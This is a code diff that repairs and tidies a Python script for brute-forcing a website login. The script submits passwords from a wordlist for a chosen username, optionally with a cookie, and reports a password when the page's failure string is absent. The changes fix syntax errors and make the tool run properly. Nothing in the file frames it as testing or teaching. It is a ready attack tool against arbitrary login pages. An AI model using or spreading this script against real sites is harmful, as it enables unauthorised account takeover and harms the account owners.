@@ -1,31 +1,32 @@
 import requests
 from termcolor import colored
 
-url = input("enter page url")
-username=input("enter username for the account to brutforce")
-passwordfile=input("enter password file to use")
-loginfail=input("enter string that occurs when login fail")
-cookievalue=input("enter cookie value(optional)")
+url = input("Enter page URL: ")
+username = input("Enter username for the account to brute force: ")
+password_file = input("Enter password file to use: ")
+login_fail = input("Enter string that occurs when login fails: ")
+cookie_value = input("Enter cookie value (optional): ")
 
-def cracking(username,url) :
+def cracking(username, url, passwords):
     for password in passwords:
-        password=password.strip()
-        print(colored(("trying"+password) , "green"))
-        data={"username":username,"password":password,"Login":"submit"}
-        if cookievalue != "":
-            response=requests.get(url,params={"username":username,"password":password,"Login":"Login"} < cookies={"cookie":cookievalue})
+        password = password.strip()
+        print(colored("Trying " + password, "green"))
+        data = {"username": username, "password": password, "Login": "submit"}
+        if cookie_value:
+            response = requests.get(url, params={"username": username, "password": password, "Login": "Login"}, cookies={"cookie": cookie_value})
         else:
-            response=requests.post(url,data=data)
+            response = requests.post(url, data=data)
         
-        if loginfail in response.content.decode():
+        if login_fail in response.content.decode():
             pass
         else:
-            print(colored(("found username"+username) , "blue" ))
-            print(coloured(("found password"+password) , "blue" ))
+            print(colored("Found username: " + username, "blue"))
+            print(colored("Found password: " + password, "blue"))
+            return  
 
+with open(password_file, "r") as file:
+    passwords = file.readlines()
 
+cracking(username, url, passwords)
 
-with open(passwordfile,"r") as passwords :
-    cracking(username,url)
-
-print("password not in list")
+print("Password not found in the list :<{ ")
